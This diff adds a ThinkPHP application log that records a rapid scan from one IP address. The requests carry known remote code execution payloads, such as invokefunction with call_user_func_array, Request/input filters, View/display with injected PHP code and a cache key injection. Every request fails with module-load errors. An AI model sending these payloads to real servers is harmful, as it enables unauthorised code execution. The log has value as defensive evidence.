@@ -1,0 +1,66 @@
+[ 2019-06-28T01:25:58+08:00 ] 116.114.233.213 /?s=captcha&test=print%20str_replace(%27M1X%27,%270%27,%272222019M1X12345555%27);
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000006s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000208s ]
+ERR: 无法加载模块:Captcha
+
+[ 2019-06-28T01:25:58+08:00 ] 116.114.233.213 /?s=captcha
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000006s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000186s ]
+ERR: 无法加载模块:Captcha
+
+[ 2019-06-28T01:25:58+08:00 ] 116.114.233.213 /?s=getverify&test=1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000006s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000180s ]
+ERR: 无法加载模块:Getverify
+
+[ 2019-06-28T01:25:58+08:00 ] 116.114.233.213 /?s=captcha
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000006s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000201s ]
+ERR: 无法加载模块:Captcha
+
+[ 2019-06-28T01:25:58+08:00 ] 116.114.233.213 /?s=index/\think\Request/input&filter=phpinfo&data=1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000007s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000196s ]
+ERR: 无法加载模块:Index
+
+[ 2019-06-28T01:25:58+08:00 ] 116.114.233.213 /?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000006s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000180s ]
+ERR: 无法加载模块:Index
+
+[ 2019-06-28T01:25:58+08:00 ] 116.114.233.213 /?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000007s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000206s ]
+ERR: 无法加载模块:Index
+
+[ 2019-06-28T01:25:58+08:00 ] 116.114.233.213 /?s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo%28%29;?%3E
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000005s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000185s ]
+ERR: 无法加载模块:Index
+
+[ 2019-06-28T01:25:58+08:00 ] 116.114.233.213 /?s=index/\think\View/display&content=%22%3C?%3E%3C?php%20phpinfo%28%29;?%3E&data=1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000007s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000205s ]
+ERR: 无法加载模块:Index
+
+[ 2019-06-28T01:25:58+08:00 ] 116.114.233.213 /?s=index/\think\Request/input&filter=phpinfo&data=1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000006s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000176s ]
+ERR: 无法加载模块:Index
+
+[ 2019-06-28T01:25:58+08:00 ] 116.114.233.213 /?s=index/\think\Request/cache&key=1|phpinfo
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000006s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000208s ]
+ERR: 无法加载模块:Index
+
